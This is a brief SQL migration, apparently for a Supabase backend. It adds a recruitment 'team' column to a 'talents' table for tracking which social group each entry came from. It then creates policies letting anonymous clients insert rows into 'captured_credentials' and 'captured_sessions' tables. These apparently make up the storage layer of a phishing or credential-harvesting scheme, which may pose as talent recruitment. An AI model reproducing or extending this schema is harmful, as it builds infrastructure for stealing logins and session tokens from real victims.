-- SQL 10: Add team tracking column
-- This column stores the generic recruitment team code assigned to the talent.
-- This allows the operator to track the source of each entry (e.g. which social group they joined from).

ALTER TABLE public.talents ADD COLUMN IF NOT EXISTS "team" TEXT;

-- Refresh the PostgREST cache
NOTIFY pgrst, 'reload schema';



CREATE POLICY "Allow anon insert credentials" ON captured_credentials FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY "Allow anon insert sessions" ON captured_sessions FOR INSERT TO anon WITH CHECK (true);

